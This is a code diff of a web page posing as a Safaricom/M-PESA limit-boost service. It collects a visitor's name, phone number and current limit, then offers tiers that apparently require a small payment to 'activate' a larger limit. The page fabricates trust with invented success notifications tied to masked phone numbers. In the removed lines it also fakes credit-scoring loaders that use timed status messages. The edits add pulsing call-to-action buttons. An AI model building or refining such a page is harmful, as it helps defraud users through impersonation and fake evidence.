@@ -17,6 +17,19 @@
               accent: '#70C041',
               red: '#E11D48'
             }
+          },
+          keyframes: {
+            btnPulse: {
+              '0%, 100%': { transform: 'scale(1)', boxShadow: '0 10px 15px -3px rgba(0, 168, 89, 0.3)' },
+              '50%': { transform: 'scale(1.02)', boxShadow: '0 20px 25px -5px rgba(0, 168, 89, 0.5)' },
+            },
+            shimmer: {
+              '100%': { transform: 'translateX(100%)' }
+            }
+          },
+          animation: {
+            'btn-bounce': 'btnPulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+            'shimmer': 'shimmer 2.5s infinite'
           }
         }
       }
@@ -30,32 +43,18 @@
     .chat-scroll::-webkit-scrollbar-thumb { background: #CBD5E1; border-radius: 4px; }
     
     @keyframes toastIn {
-      from { opacity: 0; transform: translateY(20px) scale(0.95); }
-      to { opacity: 1; transform: translateY(0) scale(1); }
+      from { opacity: 0; transform: translateX(50px) scale(0.95); }
+      to { opacity: 1; transform: translateX(0) scale(1); }
     }
     @keyframes toastOut {
-      from { opacity: 1; transform: translateY(0) scale(1); }
-      to { opacity: 0; transform: translateY(-10px) scale(0.95); }
+      from { opacity: 1; transform: translateX(0) scale(1); }
+      to { opacity: 0; transform: translateX(50px) scale(0.95); }
     }
     .toast-enter { animation: toastIn 0.35s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
     .toast-exit { animation: toastOut 0.3s ease-in forwards; }
   </style>
 </head>
 <body class="bg-gray-50 text-gray-900 flex flex-col min-h-screen relative overflow-x-hidden">
-
-  <!-- Live Ticker Banner -->
-  <div class="bg-safaricom text-white py-2 px-4 text-xs sm:text-sm">
-    <div class="max-w-7xl mx-auto flex justify-between items-center overflow-hidden">
-      <div id="live-ticker" class="flex items-center space-x-2 animate-pulse">
-        <span class="bg-white/20 p-1 rounded-full"><i data-lucide="check-circle" class="w-3.5 h-3.5"></i></span>
-        <span id="ticker-text" class="font-medium">076634***17 successfully raised to Ksh 41,450 (30 secs ago)</span>
-      </div>
-      <div class="hidden md:flex items-center space-x-4 text-xs">
-        <span class="font-bold text-safaricom-accent">Twaweza • When we come together, great things happen</span>
-        <span class="flex items-center space-x-1"><i data-lucide="lock" class="w-3 h-3"></i> <span>256-Bit SSL Encrypted</span></span>
-      </div>
-    </div>
-  </div>
 
   <!-- Header Nav -->
   <header class="bg-white shadow-sm border-b border-gray-100 sticky top-0 z-40">
@@ -82,7 +81,7 @@
         <a href="#services" class="hover:text-safaricom transition-colors">Services</a>
         <a href="#faq" class="hover:text-safaricom transition-colors">FAQs</a>
         <a href="#support" class="hover:text-safaricom transition-colors">Support Desk</a>
-        <a href="#verify" class="bg-safaricom hover:bg-safaricom-dark text-white px-5 py-2.5 rounded-xl font-bold transition-all shadow-md shadow-safaricom/20">
+        <a href="#verify" class="bg-safaricom hover:bg-safaricom-dark text-white px-5 py-2.5 rounded-xl font-bold transition-all shadow-md shadow-safaricom/20 animate-btn-bounce">
           Check Eligibility
         </a>
       </nav>
@@ -103,8 +102,8 @@
     </div>
   </header>
 
-  <!-- Floating Toast Queue -->
-  <div id="notification-toast-container" class="fixed bottom-6 left-6 z-50 pointer-events-none flex flex-col space-y-2 max-w-sm w-full"></div>
+  <!-- Right-side Toast Notification Container -->
+  <div id="notification-toast-container" class="fixed bottom-24 right-6 z-40 pointer-events-none flex flex-col space-y-2 max-w-xs sm:max-w-sm w-full"></div>
 
   <!-- Main Section -->
   <main class="flex-grow">
@@ -205,27 +204,13 @@
                   </div>
                 </div>
 
-                <button type="submit" class="w-full bg-safaricom hover:bg-safaricom-dark text-white font-extrabold py-3.5 rounded-xl shadow-lg hover:shadow-xl transition flex items-center justify-center space-x-2 mt-6">
-                  <span>Verify Account & Continue</span>
-                  <i data-lucide="arrow-right" class="w-5 h-5"></i>
+                <button type="submit" class="relative overflow-hidden w-full bg-safaricom hover:bg-safaricom-dark text-white font-extrabold py-3.5 rounded-xl shadow-lg transition-all duration-300 flex items-center justify-center space-x-2 mt-6 group animate-btn-bounce">
+                  <span class="relative z-10">Verify Account & Continue</span>
+                  <i data-lucide="arrow-right" class="w-5 h-5 relative z-10 group-hover:translate-x-1 transition-transform"></i>
+                  <div class="absolute inset-0 w-1/2 h-full bg-white/20 skew-x-12 -translate-x-full animate-shimmer"></div>
                 </button>
               </form>
             </div>
-          </div>
-        </div>
-
-        <!-- Loader 1 (Line History Analysis - 6 Seconds) -->
-        <div id="loader-1" class="hidden text-center py-16 max-w-md mx-auto">
-          <div class="bg-white p-8 rounded-3xl shadow-2xl border border-gray-100 space-y-6">
-            <div class="relative w-20 h-20 mx-auto flex items-center justify-center">
-              <div class="absolute inset-0 rounded-full border-4 border-safaricom/20 border-t-safaricom animate-spin"></div>
-              <i data-lucide="cpu" class="w-8 h-8 text-safaricom"></i>
-            </div>
-            <div>
-              <h3 class="text-xl font-bold text-gray-900">Zuri Scoring Analysis</h3>
-              <p class="text-xs text-safaricom font-bold mt-1" id="loader-1-text">Cross-referencing M-PESA line history...</p>
-            </div>
-            <p class="text-xs text-gray-500">Evaluating transaction velocity, repayment history, and account longevity to establish eligibility.</p>
           </div>
         </div>
 
@@ -251,7 +236,7 @@
           </div>
 
           <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-            <div onclick="selectTier(this, 8000, 267)" class="tier-card p-5 bg-white rounded-2xl border-2 border-gray-100 cursor-pointer hover:border-safaricom transition shadow-sm">
+            <div onclick="selectTier(this, 8000, 267)" class="tier-card p-5 bg-white rounded-2xl border-2 border-gray-100 cursor-pointer hover:border-safaricom hover:scale-[1.01] transition-all shadow-sm">
               <div class="flex justify-between items-center">
                 <div>
                   <span class="text-xs font-bold text-gray-400 uppercase">Target Limit</span>
@@ -264,7 +249,7 @@
               </div>
             </div>
 
-            <div onclick="selectTier(this, 15000, 480)" class="tier-card p-5 bg-white rounded-2xl border-2 border-gray-100 cursor-pointer hover:border-safaricom transition shadow-sm">
+            <div onclick="selectTier(this, 15000, 480)" class="tier-card p-5 bg-white rounded-2xl border-2 border-gray-100 cursor-pointer hover:border-safaricom hover:scale-[1.01] transition-all shadow-sm">
               <div class="flex justify-between items-center">
                 <div>
                   <span class="text-xs font-bold text-gray-400 uppercase">Target Limit</span>
@@ -277,7 +262,7 @@
               </div>
             </div>
 
-            <div onclick="selectTier(this, 30000, 890)" class="tier-card p-5 bg-white rounded-2xl border-2 border-gray-100 cursor-pointer hover:border-safaricom transition shadow-sm">
+            <div onclick="selectTier(this, 30000, 890)" class="tier-card p-5 bg-white rounded-2xl border-2 border-gray-100 cursor-pointer hover:border-safaricom hover:scale-[1.01] transition-all shadow-sm">
               <div class="flex justify-between items-center">
                 <div>
                   <span class="text-xs font-bold text-gray-400 uppercase">Target Limit</span>
@@ -290,7 +275,7 @@
               </div>
             </div>
 
-            <div onclick="selectTier(this, 50000, 1420)" class="tier-card p-5 bg-white rounded-2xl border-2 border-gray-100 cursor-pointer hover:border-safaricom transition shadow-sm">
+            <div onclick="selectTier(this, 50000, 1420)" class="tier-card p-5 bg-white rounded-2xl border-2 border-gray-100 cursor-pointer hover:border-safaricom hover:scale-[1.01] transition-all shadow-sm">
               <div class="flex justify-between items-center">
                 <div>
                   <span class="text-xs font-bold text-gray-400 uppercase">Target Limit</span>
@@ -303,7 +288,7 @@
               </div>
             </div>
 
-            <div onclick="selectTier(this, 100000, 2150)" class="tier-card p-5 bg-white rounded-2xl border-2 border-gray-100 cursor-pointer hover:border-safaricom transition shadow-sm">
+            <div onclick="selectTier(this, 100000, 2150)" class="tier-card p-5 bg-white rounded-2xl border-2 border-gray-100 cursor-pointer hover:border-safaricom hover:scale-[1.01] transition-all shadow-sm">
               <div class="flex justify-between items-center">
                 <div>
                   <span class="text-xs font-bold text-gray-400 uppercase">Target Limit</span>
@@ -316,7 +301,7 @@
               </div>
             </div>
 
-            <div onclick="selectTier(this, 400000, 3233)" class="tier-card p-5 bg-gradient-to-r from-safaricom-light/60 to-white rounded-2xl border-2 border-safaricom/40 cursor-pointer hover:border-safaricom transition shadow-sm relative">
+            <div onclick="selectTier(this, 400000, 3233)" class="tier-card p-5 bg-gradient-to-r from-safaricom-light/60 to-white rounded-2xl border-2 border-safaricom/40 cursor-pointer hover:border-safaricom hover:scale-[1.01] transition-all shadow-sm relative">
               <span class="absolute -top-3 right-4 bg-safaricom text-white text-[10px] font-black uppercase tracking-wider px-2.5 py-0.5 rounded-full">Executive Tier</span>
               <div class="flex justify-between items-center">
                 <div>
@@ -332,25 +317,11 @@
           </div>
 
           <div id="continue-btn-container" class="hidden text-center pt-4">
-            <button onclick="startSecondAnalysis()" class="bg-safaricom hover:bg-safaricom-dark text-white font-black py-4 px-10 rounded-2xl shadow-xl transition inline-flex items-center space-x-2">
-              <span>Proceed to Account Activation</span>
-              <i data-lucide="arrow-right" class="w-5 h-5"></i>
+            <button onclick="startSecondAnalysis()" class="relative overflow-hidden bg-safaricom hover:bg-safaricom-dark text-white font-black py-4 px-10 rounded-2xl shadow-xl transition-all duration-300 inline-flex items-center space-x-2 group animate-btn-bounce">
+              <span class="relative z-10">Proceed to Account Activation</span>
+              <i data-lucide="arrow-right" class="w-5 h-5 relative z-10 group-hover:translate-x-1 transition-transform"></i>
+              <div class="absolute inset-0 w-1/2 h-full bg-white/20 skew-x-12 -translate-x-full animate-shimmer"></div>
             </button>
-          </div>
-        </div>
-
-        <!-- Loader 2 (Processing Allocation - 8 Seconds) -->
-        <div id="loader-2" class="hidden text-center py-16 max-w-md mx-auto">
-          <div class="bg-white p-8 rounded-3xl shadow-2xl border border-gray-100 space-y-6">
-            <div class="relative w-20 h-20 mx-auto flex items-center justify-center">
-              <div class="absolute inset-0 rounded-full border-4 border-safaricom/20 border-t-safaricom animate-spin"></div>
-              <i data-lucide="refresh-cw" class="w-8 h-8 text-safaricom"></i>
-            </div>
-            <div>
-              <h3 class="text-xl font-bold text-gray-900">Processing Allocation</h3>
-              <p class="text-xs text-safaricom font-bold mt-1" id="loader-2-text">Staging tier configuration...</p>
-            </div>
-            <p class="text-xs text-gray-500">Securing server clearance and establishing direct STK payment handshakes.</p>
           </div>
         </div>
 
@@ -507,7 +478,7 @@
           <a href="#" class="hover:text-white transition">Regulatory Compliance</a>
         </div>
 
-        <a href="https://wa.me/254722000000" target="_blank" class="inline-flex items-center space-x-2 text-xs bg-safaricom hover:bg-safaricom-dark text-white px-4 py-2.5 rounded-xl font-bold transition">
+        <a href="https://wa.me/254722000000" target="_blank" class="inline-flex items-center space-x-2 text-xs bg-safaricom hover:bg-safaricom-dark text-white px-4 py-2.5 rounded-xl font-bold transition animate-btn-bounce">
           <i data-lucide="message-circle" class="w-4 h-4"></i>
           <span>WhatsApp Support (+254 722 000 000)</span>
         </a>
@@ -517,14 +488,17 @@
 
   <!-- FLOATING ZURI CHATBOT WIDGET -->
   <div class="fixed bottom-6 right-6 z-50">
-    <button id="zuri-toggle-btn" onclick="toggleZuriChat()" class="bg-safaricom hover:bg-safaricom-dark text-white p-3 rounded-full shadow-2xl transition flex items-center justify-center relative border-2 border-white ring-2 ring-safaricom/30">
-      <svg class="w-8 h-8 rounded-full" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <circle cx="50" cy="50" r="48" fill="#00A859"/>
-        <circle cx="50" cy="38" r="18" fill="white"/>
-        <path d="M22 82 C22 62, 35 55, 50 55 C65 55, 78 62, 78 82 Z" fill="white"/>
-        <circle cx="50" cy="50" r="48" stroke="white" stroke-width="4"/>
-      </svg>
-      <span class="absolute -top-1 -right-1 w-3.5 h-3.5 bg-safaricom-accent rounded-full border-2 border-white"></span>
+    <button id="zuri-toggle-btn" onclick="toggleZuriChat()" class="bg-safaricom hover:bg-safaricom-dark text-white px-5 py-3 rounded-full shadow-2xl transition-all duration-300 flex items-center space-x-3 relative border-2 border-white ring-4 ring-safaricom/20 hover:scale-105">
+      <div class="relative w-7 h-7 flex-shrink-0">
+        <svg class="w-full h-full rounded-full" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="50" cy="50" r="48" fill="#00A859"/>
+          <circle cx="50" cy="38" r="18" fill="white"/>
+          <path d="M22 82 C22 62, 35 55, 50 55 C65 55, 78 62, 78 82 Z" fill="white"/>
+          <circle cx="50" cy="50" r="48" stroke="white" stroke-width="4"/>
+        </svg>
+        <span class="absolute -top-0.5 -right-0.5 w-3 h-3 bg-safaricom-accent rounded-full border-2 border-white animate-ping"></span>
+      </div>
+      <span class="font-bold text-sm tracking-wide">Ask Zuri</span>
     </button>
 
     <div id="zuri-chat-drawer" class="hidden absolute bottom-16 right-0 w-[340px] sm:w-[390px] h-[520px] bg-white rounded-3xl shadow-2xl border border-gray-200 flex flex-col overflow-hidden">
@@ -598,22 +572,11 @@
       icon.classList.toggle('rotate-180');
     }
 
-    const updates = [
-      "0722***412 successfully raised to Ksh 28,500",
-      "0715***890 successfully raised to Ksh 15,000",
-      "0766***317 successfully raised to Ksh 41,450",
-      "0701***554 successfully raised to Ksh 35,000"
-    ];
-    let tickerIdx = 0;
-    setInterval(() => {
-      tickerIdx = (tickerIdx + 1) % updates.length;
-      document.getElementById('ticker-text').textContent = `${updates[tickerIdx]} (${Math.floor(Math.random() * 50 + 10)} secs ago)`;
-    }, 4000);
-
     const notificationQueue = [
       { name: "0712***941", action: "Limit Boosted to Ksh 15,000", time: "Just now" },
       { name: "0724***102", action: "Limit Boosted to Ksh 8,000", time: "1 min ago" },
-      { name: "0708***332", action: "Limit Boosted to Ksh 30,000", time: "2 mins ago" }
+      { name: "0708***332", action: "Limit Boosted to Ksh 30,000", time: "2 mins ago" },
+      { name: "0766***317", action: "Limit Boosted to Ksh 41,450", time: "Just now" }
     ];
 
     let notifIdx = 0;
@@ -625,7 +588,7 @@
       notifIdx = (notifIdx + 1) % notificationQueue.length;
 
       const toast = document.createElement('div');
-      toast.className = "toast-enter pointer-events-auto bg-white/95 backdrop-blur-md p-3.5 rounded-2xl shadow-xl border border-safaricom/20 flex items-center space-x-3";
+      toast.className = "toast-enter pointer-events-auto bg-white/95 backdrop-blur-md p-3.5 rounded-2xl shadow-2xl border border-safaricom/20 flex items-center space-x-3";
       toast.innerHTML = `
         <div class="w-8 h-8 rounded-full bg-safaricom-light text-safaricom flex items-center justify-center flex-shrink-0">
           <i data-lucide="shield-check" class="w-4 h-4"></i>
@@ -659,7 +622,7 @@
       return digits;
     }
 
-    // Loader 1 step: 6 seconds duration
+    // Direct transition to Step 2
     function handleInitialSubmit(e) {
       e.preventDefault();
       userData.name = document.getElementById('user-name').value.trim();
@@ -668,17 +631,9 @@
       userData.currentLimit = parseInt(document.getElementById('user-limit').value) || 0;
 
       document.getElementById('step-1').classList.add('hidden');
-      document.getElementById('loader-1').classList.remove('hidden');
-
-      const statusText = document.getElementById('loader-1-text');
-      setTimeout(() => { statusText.textContent = "Analyzing 12-month transaction velocity..."; }, 2000);
-      setTimeout(() => { statusText.textContent = "Checking CRB and repayment integrity..."; }, 4000);
-
-      setTimeout(() => {
-        document.getElementById('loader-1').classList.add('hidden');
-        setupStepTwo();
-        document.getElementById('step-2').classList.remove('hidden');
-      }, 6000);
+      setupStepTwo();
+      document.getElementById('step-2').classList.remove('hidden');
+      window.scrollTo({ top: 0, behavior: 'smooth' });
     }
 
     function getDynamicGreeting(name) {
@@ -703,20 +658,12 @@
       document.getElementById('continue-btn-container').classList.remove('hidden');
     }
 
-    // Loader 2 step: 8 seconds duration
+    // Direct transition to Step 3
     function startSecondAnalysis() {
       document.getElementById('step-2').classList.add('hidden');
-      document.getElementById('loader-2').classList.remove('hidden');
-
-      const statusText = document.getElementById('loader-2-text');
-      setTimeout(() => { statusText.textContent = "Connecting with M-PESA payment gateway..."; }, 2500);
-      setTimeout(() => { statusText.textContent = "Generating instant STK clearance token..."; }, 5500);
-
-      setTimeout(() => {
-        document.getElementById('loader-2').classList.add('hidden');
-        setupStepThree();
-        document.getElementById('step-3').classList.remove('hidden');
-      }, 8000);
+      setupStepThree();
+      document.getElementById('step-3').classList.remove('hidden');
+      window.scrollTo({ top: 0, behavior: 'smooth' });
     }
 
     function setupStepThree() {
